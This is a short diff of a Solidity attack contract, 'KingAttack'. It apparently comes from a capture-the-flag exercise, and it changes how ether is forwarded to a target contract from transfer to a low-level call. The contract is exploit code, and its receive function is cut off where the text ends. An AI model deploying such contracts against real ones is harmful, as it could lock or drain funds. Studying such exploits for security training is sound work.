@@ -3,8 +3,9 @@
 pragma solidity ^0.6.0;
 
 contract KingAttack {
-    function attack(address target) external payable {
-        payable(target).transfer(msg.value);
+    function attack(address payable target) external payable {
+        (bool success,) = target.call.value(msg.value)('');
+        require(success, 'ether send failed');
     }
 
     receive() external payable {
